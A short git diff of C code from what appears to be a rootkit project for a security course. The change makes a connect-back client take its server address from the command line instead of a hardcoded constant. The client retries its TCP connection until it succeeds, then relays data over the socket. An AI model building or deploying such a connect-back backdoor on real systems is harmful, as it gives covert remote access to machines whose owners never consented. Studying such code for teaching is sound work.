@@ -11,15 +11,15 @@
 #define FILE_LOCATION "/usr/home/comp6447/rootkit/src/bin/test"
 #define DEBUG 1
 
-int attempt_connection_to_server();
+int attempt_connection_to_server(char * remote_address);
 void read_and_write(int socket_fd);
 
 int main(int argc, char** argv)
 {
-
+	char * remote_address;
 	if(argc == 2)
     {
-        char * remote_address = argv[1];
+        remote_address = argv[1];
 	}
 	else
     {
@@ -28,7 +28,7 @@ int main(int argc, char** argv)
 	}
 
 	int sock;
-    while( (sock = attempt_connection_to_server()) == -1)
+    while( (sock = attempt_connection_to_server(remote_address)) == -1)
 	{
 		if(DEBUG)
 			printf("Sleeping\n");
@@ -87,12 +87,12 @@ void read_and_write(int socket_fd)
 
 
 
-int attempt_connection_to_server(){
+int attempt_connection_to_server(char * remote_address){
 	// Create addr struct
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port = htons(REMOTE_PORT);    // Port
-    addr.sin_addr.s_addr = inet_addr(REMOTE_ADDRESS);  // Connection IP
+    addr.sin_addr.s_addr = inet_addr(remote_address);  // Connection IP
 
     // Create socket
     int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
